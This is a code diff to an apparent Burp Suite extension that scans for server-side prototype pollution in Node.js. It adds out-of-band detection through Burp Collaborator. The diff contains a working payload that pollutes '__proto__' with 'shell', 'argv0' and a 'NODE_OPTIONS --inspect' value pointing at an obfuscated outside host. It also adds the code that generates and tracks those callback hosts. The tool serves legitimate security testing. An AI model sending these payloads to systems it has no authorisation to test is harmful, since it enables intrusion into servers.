@@ -3,11 +3,14 @@ package burp;
 import com.google.gson.*;
 
 import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import static burp.PrototypePollutionBodyScan.MAX_RETRIES;
 
 public class PrototypePollutionAsyncBodyScan extends Scan {
     final Boolean injectSpecificProperties = false;
+    final static String collaboratorPlaceholder = "$collaborator_placeholder";
     static final Map<String, String[]> asyncTechniques = new HashMap<String, String[]>()
     {
         {
@@ -15,8 +18,7 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
                     "__proto__"," {\n" +
                     "\"argv0\":\"node\",\n" +
                     "\"shell\":\"node\",\n" +
-                    "\"env\":{\"a51b834b7\":\"x\"},\n" +
-                    "\"NODE_OPTIONS\":\"--inspect=<@replace('.','\\\\\\\"\\\\\\\".')>$collabplz<@/replace>\"\n" +
+                    "\"NODE_OPTIONS\":\"--inspect="+collaboratorPlaceholder+"\"\n" +
                     "}"
             });
         }
@@ -26,7 +28,9 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
     public List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
         Utilities.out("--Running async body scan--");
         for (Map.Entry<String, String[]> technique : asyncTechniques.entrySet()) {
-            doAttack(baseReq, Utilities.getBody(baseReq), service, technique);
+            ArrayList<String> collabPayloads = new ArrayList<>();
+            technique.getValue()[1] = replacePlaceholderWithCollaboratorPayload(technique.getValue()[1], collabPayloads);
+            doAttack(baseReq, Utilities.getBody(baseReq), service, technique, collabPayloads);
         }
 
         return null;
@@ -46,7 +50,7 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
         }
     }
 
-    public void doAttack(byte[] baseReq, String jsonString, IHttpService service, Map.Entry<String, String[]> technique) {
+    public void doAttack(byte[] baseReq, String jsonString, IHttpService service, Map.Entry<String, String[]> technique, ArrayList<String> collabPayloads) {
         if(!jsonString.trim().startsWith("{") && !jsonString.trim().startsWith("[")) {
             return;
         }
@@ -60,7 +64,16 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
                     attackRequest = Utilities.setBody(attackRequest, attackJsonString);
                     attackRequest = Utilities.fixContentLength(attackRequest);
                     if (attackRequest != null) {
-                        request(service, attackRequest, MAX_RETRIES);
+                        Resp reqResp = request(service, attackRequest, MAX_RETRIES);
+                        int reqId = -1;
+                        if(collabPayloads.size() > 0) {
+                            reqId = BurpExtender.collab.addRequest(new MetaRequest(reqResp.getReq()));
+                        }
+                        for (String collabPayload : collabPayloads) {
+                            if(reqId > 0) {
+                                BurpExtender.collab.addCollboratorPayload(collabPayload, reqId);
+                            }
+                        }
                     }
                 }
             }
@@ -70,7 +83,16 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
             if (attackJson != null && !attackJson.isJsonNull()) {
                 attackRequest = Utilities.setBody(attackRequest, attackJson.toString());
                 attackRequest = Utilities.fixContentLength(attackRequest);
-                request(service, attackRequest, MAX_RETRIES);
+                Resp reqResp = request(service, attackRequest, MAX_RETRIES);
+                int reqId = -1;
+                if(collabPayloads.size() > 0) {
+                    reqId = BurpExtender.collab.addRequest(new MetaRequest(reqResp.getReq()));
+                }
+                for (String collabPayload : collabPayloads) {
+                    if(reqId > 0) {
+                        BurpExtender.collab.addCollboratorPayload(collabPayload, reqId);
+                    }
+                }
             }
         }
     }
@@ -116,6 +138,20 @@ public class PrototypePollutionAsyncBodyScan extends Scan {
             }
         }
         return null;
+    }
+
+    static String replacePlaceholderWithCollaboratorPayload(String vector, ArrayList<String> collabPayloads) {
+        Matcher m = Pattern.compile(collaboratorPlaceholder.replace("$", "\\$")).matcher(vector);
+        while (m.find()) {
+            String collaboratorPayloadID = BurpExtender.collab.generateCollabId();
+            collabPayloads.add(collaboratorPayloadID);
+            vector = vector.replaceFirst(collaboratorPlaceholder.replace("$", "\\$"), obfuscateHost(collaboratorPayloadID+"."+BurpExtender.collab.getCollabLocation()));
+        }
+        return vector;
+    }
+
+    static String obfuscateHost(String host) {
+        return host.replaceAll("[.]","\\\\\\\\\"\\\\\\\\\".");
     }
 
     PrototypePollutionAsyncBodyScan(String name) {
